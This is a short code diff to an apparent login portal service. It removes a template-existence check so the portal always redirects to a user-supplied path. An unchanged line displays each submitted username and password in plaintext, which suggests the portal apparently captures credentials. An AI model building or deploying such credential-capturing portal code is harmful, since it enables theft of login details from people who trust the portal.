@@ -119,15 +119,12 @@ class PortalService:
                 self.messages.display(f"Login U: {username} P: {password}")
             )
 
+            # No redirect param = return homepage
             if not redirect_target:
                 return self.render_default_template()
 
-            redirect_file = redirect_target.strip("/")
-
-            if os.path.exists(f"templates/{redirect_file}.html"):
-                return redirect(f"http://{self.domain}{redirect_target}")
-            else:
-                return self.render_default_template()
+            # Always redirect, assume the template exists
+            return redirect(f"http://{self.domain}{redirect_target}")
 
         @server.route("/<path>", methods=["GET"])
         def catch_all(request, path):
